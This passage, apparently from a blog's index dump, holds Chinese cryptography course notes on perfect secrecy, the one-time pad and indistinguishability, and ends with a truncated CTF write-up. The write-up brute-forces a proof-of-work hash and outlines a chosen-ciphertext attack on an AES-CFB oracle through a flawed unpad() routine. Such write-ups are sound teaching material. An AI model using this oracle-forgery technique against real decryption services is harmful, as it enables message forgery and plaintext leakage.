与它们看到的密文无关（攻击者根本无法从挑战密文中区分出其到底是由哪一个明文加密而来），因此这些攻击者相当于在 $0,1$ 之间均匀随机的选取 $b'\\gets{0,1}$ （也就是乱猜）。 在教材中有提到披露明文长度对加密安全性可能带来的风险，在此便不再赘述，有兴趣的同学可以参考（PG.56） *Semantic Security 在本章节中，我们将介绍语义安全，语义安全是 Indistinguishability 的另外一种等价表述，它将我们对加密的安全性定义精确地公式化，我们可以看到在这种方式下的定义更加精细能够加深我们对于组成安全性定义各部件的理解。在给出 Semantic Security 的定义之前，我们先来看看两种较弱的表述，并且我们将说明它们暗含了 EAV-Security 的内涵。 THEOREM 3.10\" THEOREM 3.10 Formally, we show that if an EAV-secure encryption scheme $(Enc,Dec)$ is used to encrypt a uniform message $m\\in {0,1}^l$，then for any $i$ it is infeasible for an attacker given the ciphertext to guess the $i$th bit of $m$ (here denoted by $m^i$) with probability much better than $\\frac{1}{2}$ 在安全参数 $n$ 下，PPT 攻击者无法在观察到密文的情况下能以比 $\\frac{1}{2} + negl(n)$ 更大的概率猜测出原文在第 $i$ 位上的比特是 $0$ 还是 $1$ 。在教材（PG.57）中给出了证明，教材在这里使用了 Reduction 证明方式，这样的证明方式在本课程中还会出现非常多次，因此其重要性不言而喻，建议同学们充分理解该处的内容。我将在下方尽可能地讲解该证明的精髓，仅供参考。 为了证明：当 $\\Pi = (Enc,Dec)$ 是一个 fixed-length private-key encryption scheme 对长度为 $l$ 的消息是 EAV-Security 的，那么对于任意 PPT 攻击者 $A$ 和 消息中的任意比特位 $i\\in {1,…,l}$，存在一个可忽略的函数 $negl$ 有 $Pr[A(1^n,Enc_k(m))=m^i]\\leq\\frac{1}{2}+negl(n)$ 成立，我们需要对问题进行转换以便利用到方案 $\\Pi$ 满足 EAV-Security。也就是说我们可以利用方案 $\\Pi$ 满足 EAV-Security 的定义，那么对于任意 PPT 的攻击者 $A'$ ，其进行 adversarial indistinguishability experiment 有 $Pr[PrivK^{eav}_{A'","date":"2021-12-02","objectID":"/2021-12-05-chapter3/:1:2","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Private-Key Cryptography Ⅰ","uri":"/2021-12-05-chapter3/"},{"categories":null,"content":"Perfectly Secret Encryption ​ 本章节的思维导图如下所示， 章节思维导图\" 章节思维导图 ​ 在本章节中我们主要介绍完善保密理论（Perfectly Secret Encryption）并且给出一些在往下章节中经常使用的检验密码方案安全性的实验交互模型。在描述这些模型时，我们需要使用到一些基础的概率论知识，并且还需要讨论一些用于该模型中随机算法。 ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:1","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"Generating randomness ​ 在密码学中，我们经常需要产生并使用一些随机数，这些随机数的概率分布影响着密码的安全性，一些随机性较差的随机数很有可能使得该密码方案被攻破，如何高效可靠的产生随机数是密码学中一个重要的问题。在讨论随机数时，我们应该想到一个问题，随机数是如何产生的呢？由于经典的算法输出的结果都是确定性的，计算机如何产生随机数始终困扰着我。当然了，在现实生活中我们可以通过一些物理事件去产生随机的结果，比如我们可以通过抛硬币来确定一个数的比特位，从而得以生成任意长度的随机数。 ​ 我们回到我们最先提出的那个问题，计算机是如何产生随机数的呢？在现代随机数生成的过程中，主要有以下两个步骤， 计算机维护着一个高熵值的数据池，这些数据可以来自于系统中断（比如时钟中断、I/O访问请求），一些特定的物理事件。值得注意的是不管这些高熵数据的来源是什么，它们都必须得满足一点：其数据必须是不可被预测的 计算机利用高熵值数据池中的数据去扩展出一系列近乎独立与无偏差的比特流。该步骤是必不可少的，因为高熵值数据不需要严格服从均匀分布，而我们生成的随机数为使其可以安全应用于密码学组件中，其必须是得满足均匀分布的。[1] ​ 为了更好地理解[1]中所提到的步骤，我们借用教材中的例子（PG.24）去加以说明。 ​ 想象现在我们已经有了一个存储了大量高熵数据数据池，其中包含着有偏移比特序列。我们不妨假设其中 0 出现的概率为 $p$ 而 1 出现的概率为 $1-p$ （细心的读者可能会注意到按照我们这样的定义将会使得 0 与 1 出现的概率不是相互独立的，而实际上它们两者应该是相互独立的。这意味着上述假设在实践中并不是那么有效，并且我们需要做一些更加复杂的处理使得我们产生的随机数能够服从均匀分布） 在熵池中，我们有着数千比特，（比如 01001010100101101101110……），它们提供了较大的熵值。我们为了从中提取中服从均匀分布的随机数可以作如下处理， ​ 我们将上述比特流中的比特两两相邻组合成为一组，如果我们看到的比特组合为 10 我们的随机数生成器就可以先输出一位 0，如果我们看到的比特组合为 01，那我们的随机数生成器就可以输出一位 1，如果我们看到其它的组合方式我们可以采取简单方式忽略这些特定的比特组合，这样我们便能够生成符合我们要求的随机数了。 分析上述例子所产生的随机数每一位比特的概率，当随机数某一位比特为1的概率为 $p*(1-p)$ 恰好等于该位置比特为0的概率。01 00 10 10 10 01 01 10 11 01 11 ——\u003e 100011011 ​ 在密码学应用实践中，我们必须使用为密码学应用而设计的随机数生成器，避免使用不安全的随机数生成器作为密码学应用的组件。伪随机（与此相对的是我们先前提到的真随机）数生成器使用一些随机性算法来高效的生成随机数（mersenne twister），它们提供了一种高效生成随机数的方式，但在某些情况下它们却是不安全的，因此它们也经常成为CTF中相关题型的常客。我们在后续的章节中还会继续讨论有关随机数生成器的相关问题。 ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:2","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"Definitions ​ 在本节中，我们将会介绍完善保密的三种等价定义方式，并且给出基于实验交互证明密码方案安全性的模型，该模型在往后的学习过程中将会不断地出现，并且作为密码学证明中一种固定的范式，我们需要熟悉并且掌握这种证明密码方案安全性的思路与方式。为了章节的篇幅考虑，一些在证明中出现的notation我会在后续的举例中说明。 Perfect secrecy 完善保密定义\" 完善保密定义 用平常的语言来概括一下上述定义就是：当我们观察到密文 $c$ 时，我们无法从中获得任何有关于明文 $m$ 的任何信息，这句话对于任何 $c\\in C,\\space m\\in M$ 都成立。注意到 $Pr[M=m|C=c]=Pr[M=m]$，在我们观察到 $c$ 的条件下明文 $m$ 的概率分布与其原有的概率分布相同，这也就是说当我们对明文做的加密操作并没有改变明文的概率分布，攻击者无法从这个加密中获得任何有助于其重新恢复明文的有用信息。 假设我们有两段消息，其要么是 $m=ab$，要么是 $m=ab$，现在我们取 $m=ab\\space and \\space c=XX$，我们很容易可以得到 $Pr[m=ab|c=XX]=0$ （在简单的移位密码Caesar Cipher情况下，明文 $ab$ 无法通过任何操作得到密文 $XX$)，然而 $Pr[m=ab]=\\frac{1}{2}$，这也就说明了移位密码不会是完善保密的。 下面我们给出完善保密的第二种等价定义， $$ Pr[Enc_k(m)=c]=Pr[Enc_k(m')=c]\\space (2.1) $$ 完善保密第二种等价定义\" 完善保密第二种等价定义 该等式说明一个密码方案它要是完善保密的，其密文的概率分布就不应该依赖于明文。换句话说，假设任意两条消息 $m,m'\\in M$，$m$加密后得到的密文的概率分布应该与$m'$加密后得到的密文的概率分布相互独立。那么我们现在可以考虑一个问题：既然密文的概率分布和明文的概率分布相互独立，那么通过加密函数 $Enc$ 后，密文的概率分布应该与哪一个随机变量相关呢？ 这个问题的答案也是显而易见的，密码方案的随机性是通过随机数引入的，这也就是说一个明文如何映射到一个密文上是由我们所采用的密码方案和所使用的密钥决定的。上述表述暗含了我们第三种完善保密等价表述的一些内容，即密文没有蕴含任何有关明文的信息，密文的概率分布与明文的概率分布相互独立，亦即我们无法区分出给定两条消息$m,m'$ 以及由这两者经过加密之后得到的密文 $c,c'$ 之间的对应关系。（我们无从得知 $c$ 是由 $m$ 加密得到的还是由 $m'$ 加密得到的）猜测 $c$ 是由 $m$ 加密产生或由 $m'$ 加密产生其概率都为 $\\frac{1}{2}$，这也相当于在 $m$ 与 $m'$ 之中随机选择一个作为你给出的答案。 其与第一种定义表述等价的严格证明在教材（PG.28）中，有兴趣的同学可以自行参考教材。 最后我们给出完善保密的第三种等价定义，这也是我们在密码学原理这门课程中最常见地定义密码方案的一种方式——通过一种交互实验的模型 Perfect (adversarial) indistinguishability 设想有一攻击者 $A$，他可以指定任意的消息的明文 $m_1,m_2\\in M$，接着 $Gen$ 生成一个随机密钥 $k$ 。我们从 $A$ 指定的两个明文之中均匀随机的挑选出一条明文 $m_b$，并使用密钥 $k$ 对明文 $m_b$ 进行加密。最终 $A$ 能够观察到加密后的密文，我们让 $A$ 去“猜测”（如果他有更好的办法的话也许不能够叫做猜测） 我们所加密的密文 $Enc_k(m_b)$ 对应的明文是 $m_1,m_2$ 中的哪一个。我们可以作如下定义，$A$ 在这次实验中成功当且仅当其猜对了密文所对应的明文。 在上述铺垫过后，我们可以对敌手不可区分性下一个定义， An Encryption scheme is perfectly indistinguishable if no adversary $A$ can succceed with probability better than $\\frac{1}{2}$. We stress that no limitations are placed on the computational power of $A$ 上述定义告诉我们，一个加密方案若满足敌手不可区分性，那么也就意味着没有任何一个敌手 $A$ 能够使得上述实验成功的概率大于 $\\frac{1}{2}$，并且我们并不需要限制敌手 $A$ 的计算能力。简单来说，攻击者 $A$ 在拿到我们加密过后的密文之后并不能从密文中有效的区分出其给定的明文的一丁点儿信息，他对输出结果的选择是真实地猜测（也就是在$m_0,m_1$中均匀随机二选一），它没有更好地办法（算法）使得其能够区分出该密文是由哪一个明文加密而来的，这也就是我们上述在其它完善保密的定义中一直强调的密文不泄露明文的任何信息。这样，我们便可以给出基于实验交互的模型。 The adversarial indistinguishability experiment $PrivK^{eav}_{A,\\pi}$ : The adversary $A$ outputs a pair of messages $m_0,m_1\\in M$. A key $k$ is generated using $Gen$, and a uniform bit $b\\in {0,1}$ is chosen. Ciphertext $c\\gets Enk_k(m_b)$ is computed and given to $A$. We refer to $c$ as the challenge ciphertext. $A$ outputs a bit $b'$ The output of the experiment is defined to be 1 if $b' =b$, and 0 otherwise. We write $PrivK^{eav}_{A,\\pi}=1$ if the output of the experiment is and in this case we say that $A$ succeeds. 解释一下上述notations的含义，$PrivK$ 代表该Experiment是在Private-Key Encryption中的，$eav$ 描述了攻击者 $A$ 的能力为仅能够窃听信道，$A$ 指定了一个攻击者，$\\pi$ 代表了具体所使用的Private-Key Encryption的scheme，亦即指定了 $Enc_k(m_b)$ 的具体形式以及相关的预操作。 实验交互框图如下所示， 交互实验框图\" 交互实验框图 经过上面的铺垫之后，我们能够给出完善保密的第三种等价定义， 完善保密第三种等价定义\" 完善保密第三种等价定义 教材（PG.30）中展示了使用第三种定义方式判断Vigenère cipher在某些参数设置下不是完美不可区分的相关证明，有兴趣的读者可以自行参考。 ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:3","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"The One-Time Pad 在本节中，我们将会介绍一个 perfectly secret encryption scheme 的实例 —— One-Time Pad （一次一密乱码本） 在1917年，Vernam为他的完善保密加密方案申请了一项专利，现如今其加密方案即我们所熟知的 one-time pad. 在他提出该加密方案的那个年代还没有完善保密的概念更没有相关的证明。事实上过了25年之后，香农给出了完善保密的定义并且展示了一种满足完善保密定义的加密方案，即我们这里所说的One-Time Pad。 为了介绍 One-Time Pad 中 $Enc_k(·)$ 的具体实现，我们需要了解一下异或（XOR）及其相关性质，具体的资料可以参考维基百科，在此便不在赘述。 THEOREM 2.10 The one-time pad encryption scheme is perfectly secret. 下面我们来看一下 One-Time Pad Encryption Scheme 的具体构造， 一次一密方案\" 一次一密方案 有关该方案是完善保密的证明在教材的（PG.32）中有详细说明，关键证明为我们所提到的完善保密的第一种等价定义 $Pr[M=m|C=m]=Pr[M=m]$，通过全概率公式以及贝叶斯公式的转化我们可以很容易的将问题解决，关键是要注意到 $Pr[C=c|M=m]=2^{-l}$ ，这里的 $l$ 指的是密钥长度。在此强调在观察到一个确切的明文时我们对其经过加密后得到的特定密文的概率取决于加密方案本身。 一个很简单的例子，对于一个 $Enc_k(·)$，无论其输入是什么，我们都定义其输出为一个确定的 $c^{*}$ ，这样在提供加密方案的情况下我们很容易可以知道 $Pr[C=c^*|M=m]=1$ 在一个这么简单的例子中，我们可以发现一个事实，即一个加密方案若是确定性的加密方案，其必定不可能是安全的，我们必须引入一些随机化到加密方案中以实现 $Pr[C=c|M=m]$ 为一个较小的概率（根据安全性参数去确定这个概率到底需要多小） 一次一密乱码本加密方案是完善保密的正确性建立在其密钥没有重复使用的前提之上，下面我们考虑一个密钥重用的例子。 考虑我们使用相同的密钥 $k$ 去加密两条消息 $m_1,m_2$ 根据一次一密加密方案，我们很容易的得到其加密后的密文 $c_1=m_1\\oplus k,c_2=m_2\\oplus k$，我们可以对 $c_1,c_2$ 进行异或来消去密钥 $k$ 的 mash，即 $c_1\\oplus c_2 = m_1 \\oplus m_2$ 通过该操作之后，我们可以恢复关于明文的信息，这显然不符合完善保密的定义。 这也告诉我们重复使用密钥可能是一个非常危险的举动，在相关密码应用的设计中应该时刻注意到这一点，避免使用相同的随机化参量。 有关 One-Time Pad Encryption Scheme 的历史趣闻可以在教材的（PG.33）中获取，有兴趣的读者可以自行了解。 ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:4","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"Limitations of Perfect Secrecy 既然完善保密理论告诉我们满足完善保密定义的加密方案在不考虑敌手计算能力的情况下都是十分安全的，那么我们是不是就可以万事大吉，在应用实践中全面使用完善保密加密方案就行了呢？答案肯定是否定的，为了达到如此的安全性，其所付出的代价也是十分明显的，以至于无法在实践中大面积应用。在这节中，我们将阐述完善保密理论内在的缺陷，注意这缺陷并不是针对特定的加密方案，而是在完善保密其内有的特性。 具体来说，我们可以证明任何完善保密加密方案的密钥空间至少要与其明文空间一样大 $|K| = |M|$ ，如果所有的密钥都是相同的长度并且明文空间中的明文长度也固定的话，这意味着密钥至少要与明文一样长，在 One-Time pad 中达到了这种情况的最优值（明文长度等于密钥长度）。 THEOREM 2.11\" THEOREM 2.11 该定理相关的证明可以在教材中（PG.34）中找到，有兴趣的读者可以自行参考。 假设 $|K|\u003c|M|$，去证明 $Pr[M=m|C=c]\\neq Pr[M=m]$ 不符合完善保密定义 由于 $|K| \u003c |M|$ ，这将导致某一确定的密文 $c^{*}$ 通过 $Dec_k(·)\\space\\forall\\space k\\in K$ 之后得到的集合 $M(c^{*})$ 有 $|M(c^{*})| \u003c|K|$ ，也就意味着存在 $m'\\in M$ 但是 $m'\\notin M(c^{*})$ ，由此我们可以得到 $Pr[M=m'|C=c^{*}]=0\\neq Pr[M=m']$，这样我们便可以证明 THEOREM 2.11 要想达到完善保密的安全性就必须使用至少与明文空间大小相同的密钥空间，任何试图说明其加密方案可以使用短密钥达到完善保密安全性的方案都是在耍流氓：） 使用完善保密加密方案去加密长消息在存储开销上显然是不经济的（我们需要一个与原文件至少一样大的密钥！！！），这种开销在网络带宽受限并且昂贵的情况下更是无法接受。比起绝对的安全，人们更想经济地实现安全（使用短密钥加密长消息并能够达到令人满意的安全性需求） ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:5","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"*Shannon’s Theorem Shannon’s Theorem 提供了另一种判定该方案是否是完善保密的另一种表述，该表述的粗略描述如下：在特定的条件下，密钥生成算法 $Gen$ 必须随机均匀的从所有可能的密钥集合中（在密钥空间中）选取一个集合元素作为 $Key$ 。更进一步对于所有明文空间中的任意消息 $m$ 和所有密文空间中的密文 $c$ 都存在着一个由 $m$ 到 $c$ 独一无二的映射（由特定的密钥 $k$ 决定）在这里该定理的陈述基于 $|M|=|K|=|C|$ 的假设，满足这种假设的完善保密方案可以说是一种最优的方案，因为我们上述讨论过要是得方案满足完善保密必须有 $|K|\\geq|M|$ 且 $|C|\\geq|M|$ THEOREM 2.12\" THEOREM 2.12 详细证明可参考教材（PG.35） 香农定理给出了一个能够使用简单的方式（不需要去计算概率）去判断一个加密方案是否满足完善保密的方式，不过要注意使用Shannon’s theorem的前提，即 $|M|=|K|=|C|$ 在Shannon’s Theorem中我们还能了解到以下事实，对于任意一个明文消息 $m$ 其唯一映射到一个密文空间中的元素 $c$，具体的映射关系由 $k$ 与具体的加密方案所决定。并且在 (1) 中决定了 $k$ 的选取必须均匀随机，否则明文映射到密文上的概率分布就不是均匀分布了，而这就会破坏完善保密。 ","date":"2021-11-22","objectID":"/2021-11-26-chapter2/:0:6","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Perfectly Secret Encryption","uri":"/2021-11-26-chapter2/"},{"categories":null,"content":"Course Overview Cryptology: Science concerned with data communication and storage in secure and usually secret form. Cryptography (密码学) Cryptanalysis (密码分析学) Our goals: the basic principles of modern cryptography mathematical assumptions (数学假设) security proof (安全证明) some standard (secure) constructions (一些现行标准密码方案的构造) Textbook: Introduction to MODERN CRYPTOGRAPHY 3rd edition ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:1","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"Course Structure Introduction To Modern Cryptography\" Introduction To Modern Cryptography Symmetric Asymmetric Encryption Private-Key Encryption Public-Key Encryption Authentication Message Authentication Codes Digital Signature 课程由古典密码学开始，讲述经典的古典密码（Caesar Cipher \u0026 Vigenère Cipher）以及从其中所抽象出来的编码思想（单表置换密码与多表置换密码）。这个时期的密码更像是个人的灵光乍现（heuristic），没有什么固定的范式和数学基础，其更多的被认为是一种艺术( the art of writing or solving codes)，一种个人通过巧妙的构思运用简单/相对复杂的规则将明文空间映射到密文空间上规则（这已经运用到了现代密码学的术语）。接着课程教授展示了运用现代密码分析学技巧破解上述两种古典密码方案的攻击方式（频率分析方法），由于古典密码学不是本课程的重点，因此不在赘述，有兴趣的朋友可以参考教材（Pg. 9）。 多表位移（poly-alphabetic shift）密码成为了现代密码学中流密码（Stream Cipher）的源泉，而多表代换密码（poly-alphabetic shift）成为了现代密码学中分组密码（Block Cipher）的源泉。 紧接着是现代密码学。在现代密码学中我们可以看到一种严谨的数学形式化表达，不同于古典密码，现代密码学有着一套严格且规范的数学定义去描述密码方案以及密码方案安全性，于此同时发展出了一种证明密码学方案安全性的规约证明方式（Deduction）。现代密码学有两条明显的主干，一是对称密码学也叫做私钥密码学（Private-Key Cryptography OR Symmetric Cryptography），另一是公钥密码学也叫做非对称密码学（Public-Key Cryptography OR Asymmetric Cryptography）。 Dolev-Yao威胁模型：The Dolev–Yao model,[1] named after its authors Danny Dolev and Andrew Yao, is a formal model used to prove properties of interactive cryptographic protocols. （From WiKipedia） Pseudo-random Number Gerneration \u0026 Multi-party Secure Computation (MPC) 以及上述的Dolev-Yao Model都是 Yao 在密码学领域的开创性工作 By the way, Andrew Yao 是清华大学交叉信息研究院院长姚期智院士 在非对称密码学中我们将讲述公钥加密方案（Public-Key Encryption）与数字签名（Digital Signature），这两者涉及到了密码学中的两大方向，认证（Authentication）与加密（Encryption）也就是关于如何保护信息的机密性与完整性。 在对称密码学中我们将讲述消息认证码（Message Authentication Code MAC）、流密码（Stream Cipher）、分组密码（Block Cipher）和哈希函数及其应用（Hash Function and applications）。 这里引用教材中由古典密码学转向现代密码学期间发生的方法论上的重大转变， In short, cryptography has gone from a heuristic set of tools concerned with ensuring secret communication for the military to a science that helps secure systems for ordinary people all across the globe. 在本课程中，我们会对上述两种不同的密码学方向以及组成它们的各个部件给出其精确的形式化数学定义，并建立Dolev-Yao Model对密码方案的安全性作出证明。在学习本课程中要始终牢记一点，即密码学是建立在一定的基础假设之上的，我们需要假设攻击者所具有的能力，需要考虑攻击者所拥有的可能攻击算法的算法复杂度，至一点至关重要。我们考虑的始终是攻击者在拥有某种时间复杂度算法的条件下，该方案被攻破的概率，因此要想充分理解这其中的精髓我们还需要对概率论与计算复杂度理论有一定的了解，明白了这些我们才能更加深入的理解密码学理解信息科学。 ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:2","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"Private-Key Setting ​ 在本主题下我们简要介绍一下当我们说Symmetric Encryption时我们究竟在说什么？Symmetric Encryption中文译为对称加密，与其简单的称其为对称加密不如完整的称其为对称加解密。在古典密码学一章中我们知道了通信双方想要在一个公开信道下实现秘密通信需要对原先要传输的信息/明文（plaintext）（我们不妨将其认为是具有语义的信息）进行一个变换，使其转变为窃听者无法从其获取到明文的信息的密文(ciphertext)数据，在这里我们需要对变换作出定义，这种定义就构成了我们的密码方案，而所有的这些密码方案都需要基于一个保密的信息，也就是我们所熟知的密钥（Key）。在本主题Private-Key下，我们所讨论的密钥在通信的双方的背景之下是相同的。 考虑以下这个场景 Alice和Bod是需要秘密通信的双方，它们事先私下会面，共同商讨了一个用于他们后续秘密通信的密钥，并对此密钥在接下来通信中的使用达成了共识。紧接着Alice和Bod回到各自的住所（空间上是相互隔离的），开始建立通信（这里的通信信道多种多样，你可以飞鸽传书也可以使用互联网），Alice和Bod使用它们预先商讨好的密钥对消息进行加密，并把加密好的密文推入信道。如果这时候他们通信的信道被一个第三者Eve截获（Eve只是个监听者），Eve无法在没有密钥的情况下获得关于明文的任何信息，这样便做到了在信息被敌手（adversary）截获的条件下保证消息的机密性。而Alice/Bod将从信道中取出密文并使用密钥对其进行解密，便可以恢复对方所传输的明文消息。（不考虑信息的完整性，即消息在传输的过程中是否被篡改）在这里加密和解密所使用到的密钥都是相同的，这也是Symmetric的含义，即通信双方实际上拥有的东西是等同的。 通信双方使用一个安全信道进行通信\" 通信双方使用一个安全信道进行通信 ​ 在这里我们注意到一点就是我们一直强调的是密钥的机密性而不是强调密码方案的机密性，这点我们将会在后面的Kerckhoffs' principle中提到。 ​ 书中还给出了另外一种同一用户在本地存储介质上存储机密数据的场景，在此便不在赘述，有兴趣的朋友可以参考教材（Pg. 4） ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:3","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"The Synatax of Encryption ​ 在本主题中我们简要介绍一下加密的语义。对于一个Private-Key加密方案来说，我们首先需要指定一个明文空间 $M$,一个用于生成随机数的随机数生成器 $Gen$ ，一个用于加密消息的加密器 $Enc$ 和一个用于解密的解密器 $Dec$ . 我们对者四者 $(M,Gen,Enc,Dec)$ 有以下说明 $Gen$ 所使用的密钥生成算法是一个概率算法，这意味着每一次输入都可能输出符合某个概率分布的随机变量，我们在这并不对 $Gen$ 的概率分布作任何要求。（不过在现实的应用中 $Gen$ 的输出最好应该使得信息熵最大化） $Enc$ 接受两个输入，一个是密钥Key记作 $k$ ，一个是消息Message记作 $m$，其输出一个密文Ciphertext记作 $c$ ，我们将 $Enc_k(m)$ 称作使用密钥 $k$ 加密消息 $m$ $Dec$ 接受两个输入，一个是密钥Key记作 $k$，一个是密文Ciphertext记作 $c$ ，其输出密文对应的明文Message记作 $m$，我们将 $Dec_k(c)$称作使用密钥 $k$ 解密密文 $c$ ​ 一个加密方案必须满足下列的正确性需求：对于任意密钥生成器 $Gen$ 输出的密钥 $k$ 和所有 $m \\in M$，下列等式恒成立 $$ Dec_k(Enc_k(m)) = m $$ 所有由密钥生成算法（key-generation algorithm）生成的密钥集合称为密钥空间，记为 $K$ 。在大多数情况下 $Gen$ 的输出在密钥空间 $K$ 中服从均匀分布（uniformly distribution）。使用上述提到的工具，我们能够使用数学语言来描述上述我们提到的 Alice-Bob 秘密通信的场景。 Alice 与 Bod 通过秘密信道协商并确定使用的密钥 $k\u003c- Gen(1^n)$ Alice 使用密钥 $k$ 与 Bob 在公开信道下进行加密通信 $c:=Enc_k(m)\\space m \\in M$ Bod 在公开信道中收到密文 $c$ 并用密钥 $k$ 恢复明文 $m$，$m:=Dec_k(c)$ ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:4","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"Kerckhoffs' principle ​ 下列是教材中对Kerckhoffs' principle 的描述 The cipher method must not be required to be secret, and it must be able to fall into the hands of the enemy without inconvenience. ​ 简而言之，一个密码方案的安全性不应该依赖于整个密码方案的保密性，而应该仅仅依赖于密钥的保密性。（保密性：除了合法的通信双方，该信息不为第三方所知） ​ 这么做的好处可以简要概括为以下几点： 对一个短密钥的持续保密要比持续保密一整个加密方案要来的简单 当密钥泄露时，依照 Kerckhoffs' principle，我们可以仅仅替换密钥来最大程度的降低信息系统所面临的风险而不需要大费周章的更换一整套加密方案 再者公开机密方案有助于让同行审议以找出现存密码方案的弱点，并可以促进相关标准的制定以及有关密码方案的商业化 ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:5","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"Top Conferences 对学术感兴趣的小伙伴可以在下列 Top Conferences 中获得快乐：） IACR (International Association for Cryptologic Research) CACR (Center for Applied Cybersecurity Research) S\u0026P (IEEE Computer Society’s Technical Committee on Security and Privacy) CCS (The ACM Conference on Computer and Communication Security) USENIX Security NDSS (The Network and Distributed System Security Symposium) ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:6","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"杂谈 开设这个专栏的本意是为了重新梳理一下密码学原理课程的知识点还有就是为学弟学妹们留下一点东西，可能有些表述不太准确，言不达意，还望各位大佬不吝赐教。有关文章中出现的问题，各位可以将意见发送邮件至这个邮箱 wgblike@gmail.com ","date":"2021-11-20","objectID":"/2021-10-20-chapter1/:0:7","tags":["CourseOfCryptography"],"title":"·密码学原理课程 —— Introduction","uri":"/2021-10-20-chapter1/"},{"categories":null,"content":"0x1 Description ​ 题目描述：It’s just a decryption system. And I heard that only the Bytedancers can get secret. ​ 题目附件：JustDecrypt.py 0x2 Analysis 题目一共分为两个阶段：1）暴力破解HASH；2）Chosen-ciphertext-attack in AES CFB MODE 第一阶段的主要逻辑定义在 proof_of_work() 方法中， def proof_of_work(self): random.seed(urandom(32)) alphabet = string.ascii_letters + string.digits proof = ''.join(random.choices(alphabet, k=32)) hash_value = sha256(proof.encode()).hexdigest() self.send(f'sha256(XXXX+{proof[4:]}) == {hash_value}'.encode()) nonce = self.recv(prompt=b'Give me XXXX \u003e ') if len(nonce) != 4 or sha256(nonce + proof[4:].encode()).hexdigest() != hash_value: return False return True alphabet的长度为62，而我们需要暴力破解原文的子串长度只有4，因此可能的原文仅有 $62^4=14776336$ 种，我们能够在PPT内解决（其实相当的快） Exploit代码如下 def hash_collid(tar_hash, proof_back): with open('./prefix', 'rb') as f: prefix_set = pickle.load(f) for prefix in tqdm(prefix_set): temp = prefix + proof_back if hashlib.sha256(temp.encode()).hexdigest() == tar_hash: print(red('[*]Found! ') + prefix) return prefix 其中预先计算了所有可能的原文子串 第二阶段 chall为我们提供了一个解密Oracle，并且该Oracle使用的是AES CFB MODE，我们需要构造出恰当的密文以使其解密出的明文在 unpad 后为：Hello, I'm a Bytedancer. Please give me the flag! 在padding过程中采用了与 PKCS #7 相似的算法，不过在 unpad方法中存在漏洞，我们能够直接获取Oracle解密后的明文 @staticmethod def unpad(s): return s[:-s[-1]] 并且出于Oracle的访问限制，我们与其交互的次数有限，很有可能不能够在有限的次数内还原出合法padding的明文，但利用上述漏洞我们可以构造出符合条件的plaintext {Hello, I'm a Bytedancer. Please give me the flag!} 而不用合法的padding 接下来我们需要详细考察一下AES CFB MODE AES CFB MODE ​ 在pycryptodome库中，AES_MODE_CFB的实现依照NIST SP 800-38A, section 6.3，其大致的加解密流程如下图所示， AES CFB MODE 加解密流程\" AES CFB MODE 加解密流程 ​ 数学表述为： $$ CFB\\space Encryption \\\\ \\space I_1 = IV;\\\\ I_j = LSB_{b-s}(I_{j-1})|C^{\\#}_{j-1}\\space for\\space j=2…n;\\\\ O_j = CIPH_K(I_j)\\space for\\space j=1,2…n; \\\\ C^{\\#}_j=P^{\\#}_j\\oplus MSB_s(O_j)\\space for\\space j=1,2…n;\\\\\\\\ CFB\\space Decryption\\\\ I_1=IV;\\\\ I_j = LSB_{b-s}(I_{j-1})|C^{\\#}_{j-1}\\space for\\space j=2…n;\\\\ O_j = CIPH_K(I_j)\\space for\\space j=1,2…n;\\\\ P^{\\#}_j=C^{\\#}_{j}\\oplus MSB_s(O_j)\\space for\\space j=1,2…n $$ LSB（least significant bits）数二进制表示的低比特位 ，MSB（most significant bits）数二进制表示的高比特位 在pycryptodome库中，使用AES_MODE_CFB构造Cipher时有一个特殊的参数segment_size 其指示了plaintext与ciphertext的segement，在Doc中其描述为， ​ segment_size (integer) ​ (Only MODE_CFB). The number of bits the plaintext and ciphertext are segmented in. It must be a multiple of 8. ​ If not specified, it will be assumed to be 8. 我们可以使用AES_MODE_ECB来实现AES_MODE_CFB，具体的实现在本WP中不在多述 我们回到chall中，由于该方案使用了不安全的unpad()方法，我们能够构造一个长ciphertext（这里我用了1024Bit）使得上述 $CIPH_K(I_j)$ 内容泄露。 利用泄露的 $CIPH_K(I_j)$ 与我们已知的明文作XOR运算，便可以得到对应的密文，由此我们能够逐Byte恢复密文信息。但由于与Oracle的交互次数有限，我们并不能够得到合法的padding后的明文所对应的密文，因此我们需要利用unpad() 按照上述方法构造Hello, I'm a Bytedancer. Please give me 